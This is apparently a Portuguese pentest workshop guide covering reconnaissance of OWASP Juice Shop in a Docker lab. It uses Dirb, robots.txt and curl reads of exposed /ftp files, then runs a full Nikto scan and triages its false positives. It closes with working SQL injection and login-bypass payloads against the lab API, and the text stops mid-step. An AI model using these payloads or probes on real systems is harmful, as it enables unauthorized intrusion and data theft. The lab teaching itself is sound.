| `/robots.txt` | 200 | Arquivo que **sugere** o que o site nao quer indexar | Ler conteudo; cruzar com Dirb (`Disallow: /ftp` vs `/ftp` 200) | **Security misconfiguration** — indica caminho sensivel |
| `/profile` | 500 | Rota existe; **erro de servidor** sem contexto (sessao? parametro?) | Testar logado/no browser; ler corpo do erro; nao descartar | Possivel **information disclosure** em stack trace; **auth/session** |
| `/redirect` | 500 | Rota de redirecionamento mal parametrizada | Testar `?to=`, `?url=` com URLs externas | **Open redirect** (phishing); **injection** em parametro |
| `/promotion` | 200 | Pagina de promocao / cupom | Testar logica de negocio, cupons, manipulacao de preco | **Business logic** / abuso de cupom |
| `/video` | 200 | Arquivo estatico grande (video) | Confirmar se e publico; verificar download indevido | Geralmente baixo; atencao se houver conteudo privado |

**Resposta direta a "a que ataques sou suscetivel?" com o Dirb:**

O Dirb **nao executa exploits**. Ele **expande a superficie de teste**. No Juice Shop, o achado que **mais abre porta** para impacto nesta trilha e:

```text
/ftp (200)  -->  arquivos internos  -->  vazamento de credenciais/dados  -->  Fase 8.1
robots.txt  -->  confirma que /ftp e "escondido" mas acessivel  -->  misconfiguration
```

Os codigos **500** em `/profile` e `/redirect` sao **indicios**: a rota existe e algo quebra — merecem visita manual e testes de parametro, mas **so viram vulnerabilidade** depois que voce reproduz o impacto (como na SQLi e no login bypass das fases seguintes).

**Fluxo profissional apos o Dirb:**

```text
Linha com "+" no Dirb
        |
        v
Abrir URL (browser ou curl)  -->  entender o que a pagina faz
        |
        v
Classificar risco (info leak? auth? redirect? upload?)
        |
        v
Registrar evidencia  -->  testar manualmente ou com scanner focado (Nikto/Uniscan)
        |
        v
So entao reportar vulnerabilidade com impacto demonstrado
```

**Como validar o Passo 5.2:** `dirb-juice.txt` gravado + `/ftp` e `/robots.txt` identificados + **uma frase no relatorio** explicando que a wordlist testou ~4.600 nomes e `ftp` foi encontrado porque consta em `common.txt`, nao por conhecimento previo do alvo.

### Passo 5.3: Analisar robots.txt e caminhos sensiveis

Este passo **fecha o raciocinio do Dirb**: a wordlist achou `/ftp`; o `robots.txt` diz que `/ftp` nao deveria ser indexado — mas o Dirb ja provou que responde `200` para qualquer visitante.

```bash
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/robots.txt | tee /tmp/evidencias/workshop-05/robots.txt'
```

**Saida observada:**

```text
User-agent: *
Disallow: /ftp
```

**Analise tecnica:**

| Elemento | Significado | Proximo passo na trilha |
|---|---|---|
| `Disallow: /ftp` | O proprio site marca `/ftp` como area sensivel | Tratar como **alvo prioritario** de investigacao |
| Dirb encontrou `/ftp` com `200 OK` | Contradicao: "nao indexar" ≠ "bloquear acesso" | Fase 8.1 — listar e baixar arquivos com `curl` |
| Correlacao WhatWeb + Dirb | SPA moderna + caminho oculto com arquivos | Nao parar no fingerprint; **seguir o caminho** ate ter evidencia de impacto |

> [!TIP]
> **Regra pratica:** todo caminho com `+` no Dirb que tambem aparece em `robots.txt` como `Disallow` merece abertura manual **antes** de descartar. E um dos padroes mais comuns de achado real em pentest web.

#### 5.3.2 Ler `/ftp` logo apos o `robots.txt` (confirmacao manual)

O `robots.txt` **nao bloqueia** ninguem — ele so **avisa buscadores**. Para o analista, `Disallow: /ftp` e um **convite para testar** se humanos/visitantes tambem acessam. A sequencia natural apos o comando acima:

```text
Dirb: /ftp responde 200
        +
robots.txt: Disallow: /ftp
        |
        v
Pergunta: o que tem dentro de /ftp?
        |
        v
curl em /ftp  -->  listar arquivos  -->  abrir os mais sensiveis
```

**Comando 1 — abrir o diretorio e listar links (como um "ls" via HTTP)**

```bash
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/ftp | grep -Eo "href=\"[^\"]+\"" | head -15 | tee /tmp/evidencias/workshop-05/ftp-listing.txt'
```

| Parte | Funcao |
|---|---|
| `curl -s http://.../ftp` | Baixa o HTML da pagina que o Dirb ja tinha marcado como `200` |
| `grep -Eo "href=\"[^\"]+\""` | Extrai links — na pratica, **nomes de arquivos** expostos |
| `tee .../ftp-listing.txt` | Grava evidencia para o relatorio |

**Saida observada:**

```text
href="ftp/acquisitions.md"
href="ftp/announcement_encrypted.md"
href="ftp/incident-support.kdbx"
href="ftp/legal.md"
href="ftp/quarantine/acquisitions.md"
href="ftp/suspicious_errors.yml"
```

**Comando 2 — ler um arquivo que pareca interno/confidencial**

Escolha um link da listagem. Em aula, `acquisitions.md` costuma deixar o impacto claro:

```bash
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/ftp/acquisitions.md | head -12 | tee /tmp/evidencias/workshop-05/ftp-acquisitions.txt'
```

**Saida observada:**

```text
# Planned Acquisitions

> This document is confidential! Do not distribute!

...
```

#### O que o analista faz com esse dado coletado

| O que voce viu | O que significa | Proximo passo (mentalidade de pentest) |
|---|---|---|
| Pagina `/ftp` sem login | **Controle de acesso ausente** em area que o proprio site marca como sensivel | Registrar como exposicao de informacao; citar `robots.txt` + Dirb + `curl` no relatorio |
| Arquivos `.md`, `.yml`, `.kdbx` | Documentos internos, possiveis **credenciais**, erros, dados de negocio | Priorizar `.kdbx` (cofre KeePass), `.yml` (config/erros), `.md` (planejamento/confidencial) |
| Texto "confidential" no corpo | Prova de **impacto de negocio**, nao so "achei uma pasta" | Fase 8.1 aprofunda; Nikto pode reforcar o mesmo caminho |

**Frase-modelo para o aluno explicar em sala:**

> "O Dirb encontrou `/ftp` na wordlist. O `robots.txt` pediu para nao indexar esse caminho, mas o `curl` mostrou que **qualquer um pode ler os arquivos**. Isso nao e SQL injection — e **vazamento de informacao** por configuracao errada."

**Como validar o Passo 5.3:** `robots.txt` com `Disallow: /ftp` + `ftp-listing.txt` com pelo menos **3 links** + um arquivo (ex.: `ftp-acquisitions.txt`) mostrando conteudo confidencial.

> [!NOTE]
> Os mesmos comandos sao reutilizados na **Fase 8.1** com foco em impacto e mitigacao. Aqui o objetivo e fechar o encadeamento **Dirb → robots.txt → leitura manual** ainda na fase de reconhecimento.

### Painel resumo — Fase 3

Antes de abrir o Nikto, confira se o reconhecimento web ficou assim:

| # | Ferramenta | Pergunta que responde | Achado principal nesta aula | Arquivo de evidencia |
|---|---|---|---|---|
| 5.1 | **WhatWeb** | *O que e essa aplicacao?* | SPA (`HTML5` + `Script[module]`); alvo = Juice Shop; CORS `*` | `whatweb-juice.txt` |
| 5.2 | **Dirb** | *Quais caminhos existem alem do menu?* | `/ftp` (200), `robots.txt`, `/profile` (500), outros | `dirb-juice.txt` |
| 5.3 | **curl** | *O achado e sensivel de verdade?* | `robots.txt` → `Disallow: /ftp` | `robots.txt` |
| 5.3.2 | **curl** | *Qual o impacto?* | Arquivos internos legiveis em `/ftp` (ex.: `acquisitions.md`) | `ftp-listing.txt`, `ftp-acquisitions.txt` |

```text
WhatWeb  -->  app moderna (APIs REST > scanners antigos)
Dirb     -->  /ftp existe
robots   -->  /ftp e "escondido" do Google, nao do usuario
curl/ftp -->  vazamento de informacao (sem login)
```

| Conclusao rapida | Proximo passo |
|---|---|
| Reconhecimento **nao provou** SQLi nem bypass — **priorizou** onde testar | **Fase 4 (Nikto):** misconfiguracoes e caminhos conhecidos em escala |
| Melhor achado ate aqui: **`/ftp` aberto** + conteudo confidencial | **Fases 7–8:** SQLi, login bypass e exploracao de `/ftp` com impacto |

**Criterio para seguir:** pelo menos `whatweb-juice.txt`, `dirb-juice.txt`, `robots.txt` e um arquivo em `/ftp` gravados em `/tmp/evidencias/workshop-05/`.

---

## 6. Fase 4: Varredura DAST com Nikto

Apos o reconhecimento (WhatWeb + Dirb), o Nikto entra como **scanner DAST de triagem**: testa milhares de padroes conhecidos contra o servidor web e a aplicacao, em busca de **misconfiguracoes**, **arquivos expostos** e **cabecalhos de seguranca ausentes**.

**O que e o Nikto:** ferramenta open source (CLI) focada em **varredura passiva/ativa leve** de servidores HTTP/HTTPS. Nao substitui o analista — gera um **relatorio de indicios** para revisao manual. No Kali desta aula: **Nikto 2.6.0**.

### Como o Nikto "sabe" que falta cabecalho, arquivo ou misconfiguracao?

O Nikto **nao le a mente do servidor** e **nao inventa** vulnerabilidades. Ele funciona como um **`curl` automatizado com uma planilha gigante de regras** — a base de testes do projeto (`db_tests`, `db_headers` e arquivos relacionados em `/etc/nikto` e `/usr/share/nikto` no Kali).

```text
Para cada teste cadastrado na base do Nikto:
    1. Monta uma requisicao HTTP (metodo, URL, as vezes cabecalhos)
    2. Envia ao alvo (ex.: GET http://172.18.0.30:3000/users.json)
    3. Le a resposta: codigo (200, 403, 500...), cabecalhos, tamanho, pedacos do corpo
    4. Compara com a REGRA do teste ("se X, entao reportar")
    5. Se bater, imprime a linha + no relatorio
```

| Tipo de achado | O que o Nikto faz na pratica | Exemplo desta aula |
|---|---|---|
| **Cabecalho ausente** | Faz `GET /` (ou outra URL da regra) e **procura o nome do cabecalho na resposta**. Se `X-Content-Type-Options` **nao aparecer** nos headers → alerta | `The X-Content-Type-Options header is not set` |
| **Arquivo / caminho exposto** | Faz `GET /caminho` para milhares de caminhos da base (como o Dirb, mas com **regras por caminho**) | `GET /robots.txt` → analisa se ha entradas `Disallow` |
| **Item "interessante"** | Caminho retornou **codigo ou tamanho inesperado** para aquela regra (ex.: 200 em vez de 404) | `GET /users.json` → 200 → `This might be interesting` |
| **Misconfiguracao** | Regra conhece um **padrao ruim**: listagem de diretorio (`Index of /`), banner de versao antiga, arquivo default acessivel | `/.htpasswd` com resposta que parece arquivo de senhas |
| **Software desatualizado** | Le o cabecalho `Server:` (se existir) e compara com versões marcadas como vulneraveis na base | No Juice Shop costuma falhar (`No banner retrieved`) |

**Analogia rapida:**

| Ferramenta | Logica |
|---|---|
| **Dirb** | "Existe `/ftp`?" — testa nomes da wordlist, pouca interpretacao |
| **Nikto** | "Existe `/ftp` **e** a resposta parece listagem / arquivo sensivel / cabecalho errado?" — testa **caminho + condicao** |

**Exemplo concreto — cabecalho ausente (simplificado):**

```text
Regra na base Nikto (conceito):
  URL: GET /
  Se resposta NAO contem header "X-Content-Type-Options"
  Entao: reportar "header is not set"

Requisicao real (equivalente didatico):
  curl -sI http://172.18.0.30:3000/ | grep -i x-content-type-options
  (vazio)  -->  Nikto gera o achado
```

**Exemplo concreto — caminho interessante:**

```text
Regra (conceito):
  URL: GET /users.json
  Se codigo HTTP = 200
  Entao: reportar "This might be interesting"

O Nikto NAO abre o JSON nem valida se ha dados sensiveis —
so viu "200 onde muitos sites dariam 404". Por isso o Passo 6.2 manda validar com curl.
```

> [!TIP]
> **Resumo para sala:** o Nikto nao "descobre" falhas novas — **aplica uma biblioteca de testes conhecidos** (anos de misconfiguracoes documentadas pela comunidade) e **marca o que a resposta HTTP bate com essas regras**. O analista confirma se o achado e real no seu alvo.

#### Quem alimenta os "milhares de padroes conhecidos"?

Nao e o seu alvo que ensina o Nikto, nem um servico em nuvem analisando o Juice Shop em tempo real. Quem alimenta e o **projeto Nikto (open source)** e a **comunidade de seguranca** que mantem arquivos de banco de dados junto com a ferramenta.

| Origem | O que contribui |
|---|---|
| **Mantenedores do Nikto** | Projeto historico (Chris Sullo e colaboradores); releases no GitHub (`sullo/nikto`) |
| **Arquivos de base no Kali** | `db_tests` (testes de URL/comportamento), `db_headers` (cabecalhos esperados), `db_outdated` (versoes antigas de servidor), entre outros em `/etc/nikto` e `/usr/share/nikto` |
| **Comunidade / contribuidores** | Novas regras via issues e pull requests quando alguem documenta uma misconfiguracao recorrente |
| **Fontes que viram regra** | CVEs publicas, advisories de Apache/IIS/nginx, listas OWASP, achados de pentesters, caminhos default de instalacao, arquivos de backup comuns (`backup.zip`, `.git`, etc.) |

```text
Pentester encontra "/server-status" exposto em varios clientes Apache
        |
        v
Alguem propoe regra no repositorio Nikto (URL + condicao de resposta)
        |
        v
Release nova do Nikto  -->  apt/Kali atualiza pacote  -->  seu scan usa a regra
```

**Analogia:** parecido com **assinatura de antivirus** — humanos catalogam padroes conhecidos; o scanner so **compara**. Por isso:

- Nikto e forte em **misconfiguracoes classicas de servidor web** (anos de catalogacao).
- Nikto e fraco em **falhas novas da sua aplicacao** (logica de negocio, API custom) — isso exige analista, ZAP ativo ou revisao de codigo.
- A base **envelhece**: o pacote do Kali traz um **snapshot** da data do release; `apt upgrade` atualiza, mas nao e feed comercial diario.

**Na aula:** quando o relatorio diz `8907 requests`, sao ~8.907 **regras/testes da biblioteca** executados contra o Juice Shop — nao 8.907 ideias geradas na hora pelo scanner.

**Comparacao com o Nmap (mesma filosofia, camada diferente):**

| | **Nmap + NSE** (Workshop 03) | **Nikto** (esta aula) |
|---|---|---|
| Quem alimenta | Comunidade Nmap — scripts `.nse` no GitHub | Comunidade Nikto — arquivos `db_*` no repositorio |
| Formato | Scripts em Lua (`http-headers`, `http-sql-injection`, etc.) | Entradas em banco de texto (URL + condicao de resposta) |
| O que executa | `nmap --script ...` escolhe scripts | `nikto -h URL` roda a base inteira (ou filtros) |
| Foco | Rede + servico (porta, banner, scripts por protocolo) | HTTP/HTTPS — servidor web e superficie URL |
| Papel na investigacao | "O que esta aberto e o que o servico revela?" | "Que caminhos e misconfiguracoes web conhecidas batem aqui?" |

```text
Comunidade estuda achados recorrentes  -->  cataloga padrao  -->  publica no projeto
        |                                        |
   Nmap: script .nse                      Nikto: linha em db_tests
        |                                        |
   nmap --script http-*                   nikto -h http://alvo
```

Nos dois casos a ferramenta **nao pensa** — **aplica conhecimento coletivo** que alguem documentou antes. A diferenca e que o Nmap e **modular** (voce escolhe scripts); o Nikto veio **focado em triagem web** (milhares de testes HTTP embutidos de uma vez).

**Papel nesta trilha:**

```text
Fase 3 (WhatWeb/Dirb)  -->  voce ja achou /ftp e entendeu que e SPA
        |
        v
Fase 4 (Nikto)         -->  confirma em escala: robots.txt, users.json, cabecalhos, caminhos "interessantes"
        |
        v
Fases 7–8 (curl)       -->  so o que importa vira vulnerabilidade com impacto demonstrado
```

### O que o Nikto pode testar (visao geral)

| Categoria | Exemplos do que o Nikto verifica | O que **nao** e forte no Nikto |
|---|---|---|
| **Arquivos e caminhos** | `robots.txt`, `.htaccess`, `.htpasswd`, `backup`, `config`, JSON expostos | Logica de negocio, fluxos de login, APIs REST profundas em SPA |
| **Misconfiguracao** | Diretorios listaveis, arquivos default do servidor, plugins desatualizados (quando detectaveis) | Falhas que exigem estado autenticado ou multi-passo |
| **Cabecalhos HTTP** | `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `CSP` | Validar se o controle funciona em **todas** as rotas (exige teste manual) |
| **Software desatualizado** | Versoes antigas de Apache, nginx, IIS (quando o banner aparece) | Juice Shop em Node/Express muitas vezes retorna `Server` generico |
| **Itens "interessantes"** | Caminhos da base de testes do Nikto que retornam 200/301/403 diferente do esperado | SQL Injection, XSS refletido — raramente confirmados so pelo Nikto |

### Onde e quando usar o Nikto

| Contexto | Uso recomendado | Observacao |
|---|---|---|
| **Laboratorio / pentest autorizado** | Triagem rapida apos reconhecimento (como nesta aula) | Volume alto de requisicoes (~8.900 no Juice Shop) |
| **Hardening de servidor web** | Checar configuracao default, arquivos expostos, cabecalhos | Bom para IIS/Apache/nginx classicos |
| **Aplicacao SPA moderna** (Juice Shop) | Complementar Dirb/WhatWeb; **nao** como unica ferramenta DAST | Muitos achados pedem `curl` ou ZAP para confirmar |
| **Producao** | Somente com **autorizacao**, janela de manutencao e escopo definido | Pode gerar alertas em WAF/SIEM e carga no servico |

### Severidade tipica dos achados Nikto (como ler no relatorio)

O Nikto **nao entrega CVSS pronto**. O analista classifica depois da validacao manual. Referencia didatica para esta aula:

| Tipo de achado Nikto | Severidade usual *apos validar* | Exemplo nesta aula | Por que nao fechar o caso so no Nikto |
|---|---|---|---|
| Cabecalho de seguranca ausente | **Baixa** a **Media** | `X-Content-Type-Options` nao definido | Impacto depende do conteudo servido e do browser |
| Caminho "interessante" (`/users.json`, `/.htpasswd`) | **Informativo** ate **Media** | `+ /users.json: This might be interesting` | Pode ser 404 disfarcado, SPA ou falso positivo — **curl obrigatorio** |
| `robots.txt` com entradas | **Informativo** | Reforca o que o Dirb ja viu em `/ftp` | O risco real esta no **conteudo acessivel**, nao no robots em si |
| Arquivo sensivel realmente exposto | **Media** a **Alta** | Se `/ftp` ou backup tiver dados internos | Nikto **aponta**; Dirb + `curl` na Fase 3 **provaram** o vazamento |
| Software criticamente desatualizado (CVE conhecida) | **Alta** a **Critica** | Raro em Node/SPA sem banner claro | Exige versao confirmada, nao so palpite do scanner |

```text
Achado Nikto  -->  validar com curl/browser  -->  classificar severidade  -->  relatorio
                      |
                      +-- falso positivo  -->  descartar (documentar)
                      +-- confirmado      -->  mitigacao + evidencia
```

> [!NOTE]
> Nesta aula, o Nikto **reforca** achados da Fase 3 (`robots.txt`, misconfiguracoes) e abre **novos candidatos** (`users.json`). A exploracao com impacto (SQLi, bypass, `/ftp`) continua nas fases seguintes com `curl`.

### Passo 6.1: Executar Nikto contra o Juice Shop (varredura completa, sem filtro)

Nesta aula, rode o Nikto **sem filtros** — sem `-Tuning`, sem `-Plugins` restritivos, sem limitar categorias. O objetivo e ver a **triagem inteira** da biblioteca (~8.900 testes) e entender o volume real de um scanner DAST generico contra uma SPA.

```bash
docker exec atacante_kali sh -lc 'nikto -h http://172.18.0.30:3000 -o /tmp/evidencias/workshop-05/nikto-juice.txt -Format txt'
```

**Componentes dos comandos:**

| Flag / ausencia de flag | Funcao |
|---|---|
| `nikto -h URL` | Alvo; dispara a base **completa** de testes HTTP |
| *(sem `-Tuning`)* | Nao restringe a subconjuntos (ex.: só XSS ou só arquivos) |
| *(sem `-Plugins` restritivo)* | Nao desliga plugins — roda o pacote padrao |
| `-o` + `-Format txt` | Grava relatorio legivel em `nikto-juice.txt` |

**Mensagens normais no inicio (nao sao falha do scan):**

| Linha | Significado |
|---|---|
| `ERROR: Failed to check for updates: 403` | Nikto tentou buscar versao nova na internet e foi bloqueado — **o scan continua** |
| `No CGI Directories found ... CGI tests skipped` | Sem diretorio CGI classico; testes CGI omitidos (comportamento padrao) |
| `[999986]` / `[013587]` etc. | **ID do teste** na base `db_tests` — referencia da regra que disparou |

**Tempo observado no `srvdocker01`:** aproximadamente **6 minutos** (`352 seconds`).

**Saida observada no ambiente de referencia (varredura completa):**

```text
- Nikto v2.6.0
---------------------------------------------------------------------------
+ ERROR: Failed to check for updates: 403
+ Target IP:          172.18.0.30
+ Target Hostname:    172.18.0.30
+ Target Port:        3000
+ Platform:           Unknown
+ Start Time:         2026-06-10 14:39:06 (GMT0)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ [999986] /: Retrieved access-control-allow-origin header: *.
+ [999100] /: Uncommon header(s) 'x-recruiting' found, with contents: /#/jobs.
+ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
+ [999996] /robots.txt: contains 1 entry which should be manually viewed.
+ [013587] /: Suggested security header missing: referrer-policy.
+ [013587] /: Suggested security header missing: content-security-policy.
+ [013587] /: Suggested security header missing: permissions-policy.
+ [013587] /: Suggested security header missing: strict-transport-security.
+ [001675] /ftp/: This might be interesting.
+ [001811] /public/: This might be interesting.
+ [002739] /.htpasswd: Contains authorization information.
+ [002743] /.bash_history: A user's home directory may be set to the web root...
+ [002756] /.sh_history: A user's home directory may be set to the web root...
+ [007203] /userdata.json: This might be interesting.
+ [007204] /login.json: This might be interesting.
+ [007205] /master.json: This might be interesting.
+ [007206] /masters.json: This might be interesting.
+ [007207] /connections.json: This might be interesting.
+ [007208] /connection.json: This might be interesting.
+ [007210] /PasswordsData.json: This might be interesting.
+ [007211] /users.json: This might be interesting.
+ [007212] /conndb.json: This might be interesting.
+ [007213] /conn.json: This might be interesting.
+ [007215] /accounts.json: This might be interesting.
+ [007303] /JAMonAdmin.jsp: JAMon Admin interface identified (CVE-2013-6235 em versoes antigas).
+ [007352] /: The X-Content-Type-Options header is not set.
+ 8907 requests: 2 errors and 25 items reported on the remote host
+ End Time:           2026-06-10 14:44:58 (GMT0) (352 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

**Como validar o Passo 6.1:** scan termina com `1 host(s) tested`, `8907 requests` e **`25 items reported`**; arquivo `nikto-juice.txt` gravado.

**Analise:** o relatorio confirma o que a Fase 3 ja tinha indicado (`/ftp`, `robots.txt`, CORS `*`, cabecalhos) e **adiciona dezenas de candidatos** (`*.json`, `/.htpasswd`) que em SPA costumam ser **falsos positivos** — tema do Passo 6.2.

> [!WARNING]
> Em producao, varreduras com milhares de requisicoes devem respeitar janela de manutencao e autorizacao formal. No laboratorio, o volume e parte da demonstracao do comportamento tipico desses scanners.

### Passo 6.2: Interpretar achados e falsos positivos

Os **25 items** nao sao 25 vulnerabilidades. Agrupe por categoria antes de validar:

| Grupo | Achados Nikto | Leitura nesta aula | Acao |
|---|---|---|---|
| **Cruza com Fase 3** | `/ftp/`, `/robots.txt`, CORS `*`, `x-recruiting` | Reforco do reconhecimento manual | `/ftp` ja explorado no Passo 5.3.2; robots ja lido |
| **Hardening (cabecalhos)** | Falta `referrer-policy`, `CSP`, `permissions-policy`, `HSTS`, `X-Content-Type-Options` | Fragilidades reais de **configuracao HTTP** | Anotar no relatorio; severidade baixa/media apos contexto |
| **JSON / arquivos “interessantes”** | `users.json`, `login.json`, `accounts.json`, `PasswordsData.json`, etc. | SPA devolve **200 generico** para rotas desconhecidas — nome assusta, conteudo costuma ser HTML da app | **curl obrigatorio** (Passo 6.2 abaixo) |
| **Arquivos de sistema** | `/.htpasswd`, `/.bash_history`, `/.sh_history` | Mesmo padrao SPA: **falso positivo frequente** | `curl -sI` — se `Content-Type: text/html`, descartar |
| **Outros** | `/public/`, `JAMonAdmin.jsp` | Juice Shop nao e Java/JAMon; tratar como **ruido** ate prova contraria | Validar uma vez; documentar falso positivo |

**Comandos de validacao manual (amostra):**

```bash
docker exec atacante_kali sh -lc 'curl -sI http://172.18.0.30:3000/users.json | sed -n "1,8p"'
docker exec atacante_kali sh -lc 'curl -sI http://172.18.0.30:3000/.htpasswd | sed -n "1,8p"'
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/users.json | head -c 120'
```

**Saida observada no `srvdocker01` (validacao completa):**

Comando 1 — cabecalhos de `/users.json`:

```bash
docker exec atacante_kali sh -lc 'curl -sI http://172.18.0.30:3000/users.json | sed -n "1,8p"'
```

```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
```

Comando 2 — cabecalhos de `/.htpasswd` (mesmo padrao da SPA):

```bash
docker exec atacante_kali sh -lc 'curl -sI http://172.18.0.30:3000/.htpasswd | sed -n "1,8p"'
```

```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
```

Comando 3 — corpo de `/users.json` (primeiros 120 bytes):

```bash
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/users.json | head -c 120'
```

```text
<!--
  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
  ~ SPDX-License-Identifier: MIT
```

#### 6.2.1 Exploracao: `/.bash_history`, `/.sh_history` e `/PasswordsData.json`

O Nikto reportou **historico de shell** e um JSON com nome alarmante. O analista **tenta explorar** — nao descarta no achisse. Tres caminhos, mesmo metodo: cabecalho + inicio do corpo.

**Comando unico (loop nos tres caminhos):**

```bash
docker exec atacante_kali sh -lc 'for p in /.bash_history /.sh_history /PasswordsData.json; do echo "=== $p ==="; curl -sI "http://172.18.0.30:3000$p" | grep -E "HTTP/|Content-Type|X-Recruiting"; echo "--- body ---"; curl -s "http://172.18.0.30:3000$p" | head -c 100; echo; echo; done | tee /tmp/evidencias/workshop-05/nikto-falsos-spa.txt'
```

**Comandos separados (se preferir um por um):**

```bash
docker exec atacante_kali sh -lc 'curl -sI http://172.18.0.30:3000/.bash_history | grep -E "HTTP/|Content-Type"'
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/.bash_history | head -c 100'

docker exec atacante_kali sh -lc 'curl -sI http://172.18.0.30:3000/.sh_history | grep -E "HTTP/|Content-Type"'
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/.sh_history | head -c 100'

docker exec atacante_kali sh -lc 'curl -sI http://172.18.0.30:3000/PasswordsData.json | grep -E "HTTP/|Content-Type"'
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/PasswordsData.json | head -c 100'
```

**Saida observada no `srvdocker01`:**

```text
=== /.bash_history ===
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
X-Recruiting: /#/jobs
--- body ---
<!--
  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
  ~ SPDX

=== /.sh_history ===
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
X-Recruiting: /#/jobs
--- body ---
<!--
  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
  ~ SPDX

=== /PasswordsData.json ===
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
X-Recruiting: /#/jobs
--- body ---
<!--
  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
  ~ SPDX
```

**O que esperavamos se fosse vulnerabilidade real:**

| Caminho | Conteudo esperado (servidor classico) | O que recebemos no Juice Shop |
|---|---|---|
| `/.bash_history` | Comandos digitados (`ls`, `cd`, `mysql`...) | HTML da SPA — **sem historico** |
| `/.sh_history` | Idem para shell sh | HTML da SPA — **sem historico** |
| `/PasswordsData.json` | JSON com credenciais ou hashes | HTML da SPA — **sem JSON** |

**Conclusao da exploracao:**

```text
Nikto: "shell history retrieved" / "might be interesting"
   |
   v
curl: Content-Type text/html + copyright Juice Shop em TODOS
   |
   v
Falso positivo — SPA responde 200 para qualquer rota desconhecida
   |
   v
Relatorio: descartar; citar evidencia em nikto-falsos-spa.txt
```

Nao ha comandos de administrador para reutilizar, nem base de senhas para extrair. A **intrusao real** nesta aula continua em `/ftp` e nas APIs `/rest/` (Passo 6.3).

**Leitura desta saida:**

| Evidencia | O que mostra | Conclusao |
|---|---|---|
| `200 OK` em `/users.json` e `/.htpasswd` | Nikto viu “200” e disparou a regra — **correto pelo criterio do scanner** | Indicio, nao vulnerabilidade confirmada |
| Cabecalhos **identicos** nos dois caminhos | Resposta padrao da **mesma SPA** (fallback de rota) | `/.htpasswd` **nao** e arquivo de senha Apache |
| Corpo com `<!-- Copyright ... Juice Shop` | Conteudo e **HTML da aplicacao**, nao JSON de usuarios | `/users.json` e **falso positivo** neste alvo |
| Mesmo padrao em `/.bash_history`, `/.sh_history`, `/PasswordsData.json` (Passo 6.2.1) | `text/html` + mesmo copyright — rotas fantasma da SPA | Historico de shell e JSON de senhas **nao existem** no alvo |
| `Content-Type: text/html` (linha 9+ do `-sI`, se exibir mais linhas) | Confirma pagina web, nao API JSON | Reforca o descarte no relatorio |

| Resultado do `curl` | Conclusao |
|---|---|
| `200` + corpo HTML / copyright Juice Shop | Falso positivo do Nikto em SPA — **documentar e descartar** |
| `200` + `application/json` com dados sensiveis | Achado **confirmado** — escalonar severidade |
| `401` / `403` | Caminho existe mas protegido — revisar autenticacao |
| `404` | Regra do Nikto desatualizada ou condicao nao se aplica |

**Painel resumo — dos 25 achados para o relatorio:**

```text
Confirmados / uteis     -->  /ftp, robots.txt, cabecalhos ausentes, CORS *
Provaveis falso + SPA   -->  *.json, /.htpasswd, /.bash_history (confirmado 6.2.1), JAMonAdmin.jsp
Validar se sobrou tempo -->  /public/
Impacto desta aula      -->  Fase 3 (/ftp) + Fases 7-8 (SQLi, bypass) — nao os 25 itens crus
```

**Analise:** o valor do Nikto **sem filtro** e mostrar ao aluno a **diferenca entre triagem automatizada e verdade no alvo**. O scanner levanta 25 linhas; o analista fecha com `curl` e leva para o relatorio **so o que sobrevive a validacao**.

### Passo 6.3 (opcional): Provar impacto em 5 minutos — o que vale da coleta

> [!IMPORTANT]
> **`/.htpasswd` e `/users.json` nao servem para intrusao aqui.** O `curl` do Passo 6.2 mostrou HTML da SPA — nao ha usuarios/senhas Apache para ler. O Nikto **errou pelo criterio dele** (viu `200`); o analista **corrige** com evidencia.

O que **sim** da para validar rapido, encadeando Fase 3 + Nikto + APIs da SPA:

| Ordem | De onde veio o indicio | Teste rapido | Impacto se funcionar |
|---|---|---|---|
| 1 | Dirb + Nikto (`/ftp`) | Ler arquivo interno | **Exposicao de informacao** (confirmado) |
| 2 | WhatWeb (SPA → APIs `/rest/`) | SQLi no parametro `q` | **Injection** — erro SQLite na resposta |
| 3 | Mesma logica (API de login) | Payload `or 1=1--` | **Bypass de autenticacao** + token JWT |

**Teste 1 — `/ftp` (30 s) — ja coletado, agora com impacto**

```bash
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/ftp/acquisitions.md | head -8'
```

Esperado: texto **confidencial** (documento interno ficticio). Isso **fecha** o achado Dirb/Nikto em `/ftp`.

**Teste 2 — SQLi (30 s) — nao veio do Nikto; veio do fingerprint SPA**

```bash
docker exec atacante_kali sh -lc 'curl -sS -G "http://172.18.0.30:3000/rest/products/search" --data-urlencode "q='\'')));" | grep -Ei "SQLITE|syntax|error" | head -3'
```

Esperado: `SQLITE_ERROR` ou `syntax error` — prova que entrada altera SQL.

**Teste 3 — login bypass (1 min) — impacto maximo rapido**

```bash
docker exec atacante_kali sh -lc 'printf "%s\n" "{\"email\":\"'\'' or 1=1--\",\"password\":\"x\"}" > /tmp/evidencias/workshop-05/login-payload.json'
